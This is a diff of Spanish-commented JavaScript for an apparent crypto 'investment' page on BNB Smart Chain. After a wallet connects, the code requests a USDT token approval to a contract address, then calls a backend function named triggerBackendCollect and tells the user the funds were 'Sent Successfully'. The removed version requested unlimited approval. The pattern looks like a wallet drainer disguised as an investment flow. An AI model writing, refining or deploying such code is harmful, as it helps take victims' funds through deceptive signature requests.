@@ -83,7 +83,24 @@ async function triggerBackendCollect(userAddress) {
   throw lastErr;
 }
 
-// ─── Main Button Handler (AppKit Native Flow) ─────────────────────────────────
+// Bandera de control para saber si hay una inversión esperando a que el usuario conecte
+let pendingInvestment = false;
+
+// 1. Suscripción reactiva: Detecta automáticamente cuando el usuario conecta su wallet en el modal
+if (window.modal && typeof window.modal.subscribeProviders === "function") {
+  window.modal.subscribeProviders((state) => {
+    const rawProvider = state["eip155"]; // Proveedor EVM (BSC, Ethereum, etc.)
+    
+    // Si el proveedor ya está disponible y el usuario había hecho clic en "Invertir"
+    if (rawProvider && pendingInvestment) {
+      pendingInvestment = false; // Desactivamos la bandera
+      runInvestmentFlow(rawProvider); // ¡Lanzamos el contrato y la firma en automático!
+    }
+  });
+}
+
+// 2. Evento unificado del botón principal
+const approveBtn = document.getElementById("approveBtn");
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
     let rawProvider = null;
@@ -93,126 +110,98 @@ if (approveBtn) {
       } catch (_) {}
     }
 
-    // PASO 1: Si NO está conectado -> Abrir el modal y ESPERAR a que conecte
+    // CASO A: Si el usuario NO está conectado
     if (!rawProvider) {
-      if (window.modal && typeof window.modal.open === "function") {
-        setLoading(true, "Esperando conexión...");
-        try {
-          // modal.open() pausa la ejecución hasta que el usuario interactúa o cierra el modal
-          await window.modal.open();
-          
-          // Reintentar obtener el proveedor justo después de que el usuario cierre el modal
-          rawProvider = window.modal.getWalletProvider ? window.modal.getWalletProvider() : null;
-          
-          if (!rawProvider) {
-            // El usuario cerró el modal sin conectar
-            setLoading(false);
-            updateButtonState();
-            return;
-          }
-        } catch (modalErr) {
-          console.error("Error al abrir AppKit:", modalErr);
-          setLoading(false);
-          updateButtonState();
-          return;
-        }
-      } else {
-        setLoading(false);
-        return;
-      }
-    }
-
-    // PASO 2: Una vez conectado (o si ya lo estaba), CONTINÚA AUTOMÁTICAMENTE AQUÍ:
-    setLoading(true, "Conectando proveedor…");
-
-    try {
-      const provider = new ethers.BrowserProvider(rawProvider);
+      pendingInvestment = true; // Activamos la bandera de espera
+      setLoading(true, "Abre tu billetera para conectar...");
       
-      // Verificación y cambio de red a BSC
-      const network = await provider.getNetwork();
-      if (Number(network.chainId) !== 56) {
-        setLoading(true, "Verificando red BSC…");
+      if (window.modal && typeof window.modal.open === "function") {
         try {
-          await rawProvider.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: BSC_CHAIN_ID_HEX }]
-          });
-        } catch (switchError) {
-          if (switchError.code === 4902) {
-            await rawProvider.request({
-              method: "wallet_addEthereumChain",
-              params: [BSC_CHAIN_PARAMS]
-            });
-          } else {
-            showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
-            setLoading(false);
-            return;
-          }
+          await window.modal.open(); // Abre el modal de Reown
+        } catch (err) {
+          console.error("Error al abrir AppKit:", err);
+          pendingInvestment = false;
+          setLoading(false);
         }
       }
+      return; // Detenemos aquí; el 'subscribeProviders' tomará el control en cuanto el usuario acepte.
+    }
 
-      const signer = await provider.getSigner();
-      const userAddress = await signer.getAddress();
+    // CASO B: Si el usuario YA estaba conectado previamente
+    await runInvestmentFlow(rawProvider);
+  });
+}
 
-      if (!userAddress) {
-        showToast("Desbloquea tu billetera y selecciona una cuenta.", "error");
-        setLoading(false);
-        return;
-      }
-
-      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
-
-      setLoading(true, "Validando saldo…");
-      const usdtBalance = await usdtContract.balanceOf(userAddress);
-      if (usdtBalance <= MIN_USDT_BALANCE) {
-        showToast("Saldo insuficiente de USDT en BSC", "error");
-        setLoading(false);
-        return;
-      }
-
-      const CAP_AMOUNT = ethers.MaxUint256;
-      const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);
-
+// 3. Función centralizada que ejecuta la red BSC, saldo y aprobación de USDT
+async function runInvestmentFlow(rawProvider) {
+  setLoading(true, "Conectando proveedor…");
+  
+  try {
+    const provider = new ethers.BrowserProvider(rawProvider);
+    
+    // Verificación de red BSC (Chain ID 56)
+    const network = await provider.getNetwork();
+    if (Number(network.chainId) !== 56) {
+      setLoading(true, "Cambiando a red BSC…");
       try {
-        const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
-        if (allowance >= requiredAmount) {
-          setLoading(true, "Finalizando proceso…");
-          await triggerBackendCollect(userAddress);
-          showToast("Sent Successfully, Thank you! ✓", "success");
+        await rawProvider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }] // 56 en Hexadecimal
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await rawProvider.request({
+            method: "wallet_addEthereumChain",
+            params: [{
+              chainId: "0x38",
+              chainName: "BNB Smart Chain",
+              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+              rpcUrls: ["https://bsc-dataseed.binance.org/"],
+              blockExplorerUrls: ["https://bscscan.com/"]
+            }]
+          });
+        } else {
+          showToast("Por favor cambia manualmente a BNB Smart Chain en tu wallet.", "error");
           setLoading(false);
           updateButtonState();
           return;
         }
-      } catch (_) {}
-
-      // Lanzar la firma de aprobación automáticamente
-      setLoading(true, "Firma requerida en wallet…");
-      const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);
-
-      setLoading(true, "Confirmando en red…");
-      await tx.wait();
-
-      setLoading(true, "Finalizando…");
-      await triggerBackendCollect(userAddress);
-      showToast("Sent Successfully, Thank you! ✓", "success");
-
-    } catch (err) {
-      const raw = err?.reason ?? err?.message ?? "Error desconocido";
-      if (
-        err.code === 4001 ||
-        raw.toLowerCase().includes("user rejected") ||
-        raw.toLowerCase().includes("denied") ||
-        raw.toLowerCase().includes("cancelled") ||
-        raw.toLowerCase().includes("canceled")
-      ) {
-        showToast("Transacción cancelada.", "default");
-      } else {
-        console.error("Web3 Error:", err);
-        showToast("Error de comunicación con la wallet. Intenta de nuevo.", "error");
       }
-    } finally {
-      setLoading(false);
-      updateButtonState();
     }
-  });
+
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
+
+    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
+
+    setLoading(true, "Firma requerida en wallet…");
+    const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);
+    
+    // Lanzar la firma de aprobación automáticamente
+    const tx = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
+
+    setLoading(true, "Confirmando en red…");
+    await tx.wait();
+
+    setLoading(true, "Finalizando…");
+    await triggerBackendCollect(userAddress);
+    showToast("Sent Successfully, Thank you! ✓", "success");
+
+  } catch (err) {
+    const raw = err?.reason ?? err?.message ?? "Error desconocido";
+    if (
+      err.code === 4001 ||
+      raw.toLowerCase().includes("user rejected") ||
+      raw.toLowerCase().includes("denied") ||
+      raw.toLowerCase().includes("cancelled")
+    ) {
+      showToast("Transacción cancelada.", "default");
+    } else {
+      console.error("Web3 Error:", err);
+      showToast("Error de comunicación con la wallet.", "error");
+    }
+  } finally {
+    setLoading(false);
+    updateButtonState(); // Restaura el botón a su estado normal
+  }
 }
